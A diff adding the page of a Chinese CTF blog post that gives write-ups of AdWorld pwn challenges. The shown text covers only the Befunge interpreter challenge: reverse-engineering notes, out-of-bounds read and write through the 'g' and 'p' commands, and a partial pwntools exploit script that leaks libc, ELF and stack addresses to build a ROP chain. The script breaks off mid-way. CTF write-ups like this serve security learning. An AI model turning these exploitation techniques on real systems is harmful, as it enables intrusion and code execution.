@@ -1,0 +1,1522 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>攻防世界PWN进阶区 部分题解 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="攻防世界PWN进阶区 部分题解" />
+<meta property="og:description" content="好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://xidoo.top/2020/04/adworld-pwn0/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-04-12T19:34:07+08:00" />
+<meta property="article:modified_time" content="2020-04-12T19:34:07+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://xidoo.top/logo.png"/>
+
+<meta name="twitter:title" content="攻防世界PWN进阶区 部分题解"/>
+<meta name="twitter:description" content="好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧
+"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2020/04/adworld-pwn0/" /><link rel="next" href="http://xidoo.top/2020/05/whuctf2020/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "攻防世界PWN进阶区 部分题解",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/xidoo.top\/2020\/04\/adworld-pwn0\/"
+        },"genre": "posts","wordcount":  2524 ,
+        "url": "http:\/\/xidoo.top\/2020\/04\/adworld-pwn0\/","datePublished": "2020-04-12T19:34:07+08:00","dateModified": "2020-04-12T19:34:07+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "x1do0"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">攻防世界PWN进阶区 部分题解</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-04-12">2020-04-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2524 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#befunge">Befunge</a>
+      <ul>
+        <li><a href="#漏洞解析">漏洞解析</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+        <li><a href="#参考资料">参考资料</a></li>
+      </ul>
+    </li>
+    <li><a href="#echo-back">echo-back</a>
+      <ul>
+        <li><a href="#checksec">checksec</a></li>
+        <li><a href="#漏洞">漏洞</a></li>
+        <li><a href="#获取stdin地址">获取<code>stdin</code>地址</a></li>
+        <li><a href="#攻击stdin结构">攻击<code>stdin</code>结构</a></li>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#magic">magic</a>
+      <ul>
+        <li><a href="#checksec-1">checksec</a></li>
+        <li><a href="#漏洞-1">漏洞</a></li>
+        <li><a href="#修改_io_write_ptr">修改<code>_IO_write_ptr</code></a></li>
+        <li><a href="#泄露libc与heap_base">泄露<code>libc</code>与<code>heap_base</code></a></li>
+        <li><a href="#修改atoi_got-表项">修改<code>atoi_got</code> 表项</a>
+          <ul>
+            <li><a href="#源码分析">源码分析</a></li>
+            <li><a href="#回归正题">回归正题</a></li>
+          </ul>
+        </li>
+        <li><a href="#exp-1">exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png"
+        data-srcset="https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png, https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png 1.5x, https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png"
+        title="https://i.loli.net/2021/08/27/qordcXaAhGM7EWg.png" /></p>
+<h2 id="befunge">Befunge</h2>
+<h3 id="漏洞解析">漏洞解析</h3>
+<p>8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个<strong>Befunge</strong>语言的解释器</p>
+<!-- more -->
+<blockquote>
+<p>Befunge的代码是二维的。它用 &lt; &gt; v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。&amp; 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。</p>
+</blockquote>
+<p>保护全开，根据提示是一个Befunge93解释器，查阅一些资料（[1], [2],[3]）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># pwn @ ubuntu in /mnt/hgfs/adworld [3:39:33] C:1</span>
+$ ./interpreter-200
+Welcome to Online Befunge<span class="o">(</span>93<span class="o">)</span> Interpreter
+Please input your program.
+&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>耐心逆一下可以发现确实如此，<code>program[2000]</code>按二维组织成$25*80$。</p>
+<p>代码上下左右移动靠下面的跳转表实现。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">.rodata:00000000000014E0 <span class="p">;</span> _DWORD dword_14E0<span class="o">[</span>4<span class="o">]</span>
+.rodata:00000000000014E0 dword_14E0      dd 0, 1, 0, 0FFFFFFFFh  <span class="p">;</span> DATA XREF: main+520↑o
+.rodata:00000000000014F0 <span class="p">;</span> _DWORD dword_14F0<span class="o">[</span>4<span class="o">]</span>
+.rodata:00000000000014F0 dword_14F0      dd 1, 0, 0FFFFFFFFh, <span class="m">0</span>  <span class="p">;</span> DATA XREF: main+536↑o
+</code></pre></td></tr></table>
+</div>
+</div><p>每次读取代码后依据方向改变下一次读取位置，其中x为行数，y为列数，就像走迷宫一样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*执行方向	0-右	1-下	2-左	3-上	*/</span>
+<span class="n">prog_x</span> <span class="o">+=</span> <span class="n">dword_14E0</span><span class="p">[</span><span class="n">direction</span><span class="p">];</span>
+<span class="n">v30</span> <span class="o">=</span> <span class="n">prog_y</span> <span class="o">+</span> <span class="n">dword_14F0</span><span class="p">[</span><span class="n">direction</span><span class="p">];</span>
+<span class="n">prog_y</span> <span class="o">+=</span> <span class="n">dword_14F0</span><span class="p">[</span><span class="n">direction</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">prog_x</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>                         <span class="c1">// 25*80的program矩阵
+</span><span class="c1"></span><span class="p">{</span>
+    <span class="n">prog_x</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">prog_x</span> <span class="o">==</span> <span class="mi">25</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">prog_x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">v30</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">prog_y</span> <span class="o">=</span> <span class="mi">79</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">prog_y</span> <span class="o">==</span> <span class="mi">80</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">prog_y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>注意到program数组是<code>char</code>，stack数组是<code>QWARD</code>，所以pop和push都是<code>int64</code>类型，所以漏洞点也比较明显，在主函数中g与p都能越界，这样便可以任意地址读写，布置rop链即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">&#39;g&#39;</span><span class="o">:</span>
+    <span class="n">v26</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+    <span class="n">v27</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+    <span class="n">push</span><span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">v26</span> <span class="o">+</span> <span class="n">v27</span><span class="p">]);</span>
+    <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="sc">&#39;p&#39;</span><span class="o">:</span>
+    <span class="n">v28</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+    <span class="n">v29</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+    <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">v28</span> <span class="o">+</span> <span class="n">v29</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
+    <span class="k">break</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里我们需要泄露很多东西，got表里有<code>puts_ptr</code>和<code>program_ptr</code>，我们可以泄露<code>elf_base</code>和<code>libc_base</code>，由于要布置ROP链，也需要拿到一个栈指针，这里也是先拿到libc地址，然后用<code>environ</code>变量拿到栈指针。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>总体来说在进阶区里还是算比较难的题，逆向和漏洞利用工作量都不小。exp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./interpreter-200&#34;</span><span class="p">)</span>
+
+<span class="c1">#io = remote(&#34;220.249.52.134&#34;,33610)</span>
+<span class="c1">#gdb.attach(io,&#34;b *0xE05+0x555555554000&#34;)</span>
+
+<span class="c1"># 0x202040 -&gt; 0x201F50</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x1203+0x555555554000&#34;</span><span class="p">)</span>
+
+<span class="n">program</span> <span class="o">=</span> <span class="s2">&#34;&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&#34;</span>  <span class="c1"># leak puts_addr </span>
+
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&#34;</span> <span class="c1">#leak elf_addr </span>
+
+<span class="n">program</span> <span class="o">=</span> <span class="n">program</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;v</span><span class="se">\n</span><span class="s2">&#34;</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;v&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="o">*</span><span class="mi">78</span> <span class="o">+</span> <span class="s2">&#34;&lt;</span><span class="se">\n</span><span class="s2">&#34;</span> 
+
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;&gt;&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;v</span><span class="se">\n</span><span class="s2">&#34;</span><span class="c1"># leak stack_addr</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;v&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="o">*</span><span class="mi">78</span> <span class="o">+</span> <span class="s2">&#34;&lt;</span><span class="se">\n</span><span class="s2">&#34;</span> 
+
+<span class="n">program</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;&amp;&amp;&amp;&amp;*&amp;+p&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;v</span><span class="se">\n</span><span class="s1">&#39;</span>   <span class="c1"># ROP exploit</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;v&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="o">*</span><span class="mi">78</span> <span class="o">+</span> <span class="s2">&#34;&lt;</span><span class="se">\n</span><span class="s2">&#34;</span> 
+<span class="n">program</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;&amp;&amp;&amp;&amp;*&amp;+p&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;v</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;v&#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="o">*</span><span class="mi">78</span> <span class="o">+</span> <span class="s2">&#34;&lt;</span><span class="se">\n</span><span class="s2">&#34;</span> 
+<span class="n">program</span> <span class="o">+=</span> <span class="s2">&#34;&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;&amp;&amp;&amp;&amp;*&amp;+p&#34;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;&gt;&lt;&#39;</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">program</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">2000</span><span class="p">,</span><span class="s1">&#39;@&#39;</span><span class="p">))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-3&#34;</span><span class="p">)</span>
+
+<span class="c1">#for i in range(6):</span>
+<span class="c1">#  io.sendline(str(i+0x28))</span>
+<span class="c1">#  io.sendline(&#34;-3&#34;)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mi">10</span><span class="p">):</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
+
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &#34;</span><span class="p">)</span>
+
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="c1">#fgets_addr = u64(io.recv(6)+&#39;\x00\x00&#39;)</span>
+<span class="c1">#success(len(io.recv(6)))</span>
+<span class="n">progbuf_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x6F690</span>
+<span class="n">environ</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3c6f38</span>
+<span class="n">elf_base</span> <span class="o">=</span> <span class="n">progbuf_addr</span> <span class="o">-</span> <span class="mh">0x202040</span>
+
+<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf_base</span><span class="p">))</span>
+<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">))</span>
+<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="c1">#raw_input()</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">environ</span> <span class="o">-</span> <span class="n">elf_base</span> <span class="o">-</span> <span class="mh">0x202040</span><span class="p">)</span> <span class="o">/</span> <span class="mi">80</span>
+<span class="n">y</span> <span class="o">=</span>  <span class="p">(</span><span class="n">environ</span> <span class="o">-</span> <span class="n">elf_base</span> <span class="o">-</span> <span class="mh">0x202040</span><span class="p">)</span> <span class="o">%</span> <span class="mi">80</span>
+
+<span class="n">x_1</span> <span class="o">=</span> <span class="n">x</span> <span class="o">/</span> <span class="mi">50000</span>
+<span class="n">x_2</span> <span class="o">=</span> <span class="n">x</span> <span class="o">%</span> <span class="mi">50000</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">i</span><span class="p">))</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x_1</span><span class="p">))</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">50000</span><span class="p">))</span>
+  <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x_2</span><span class="p">))</span>
+
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
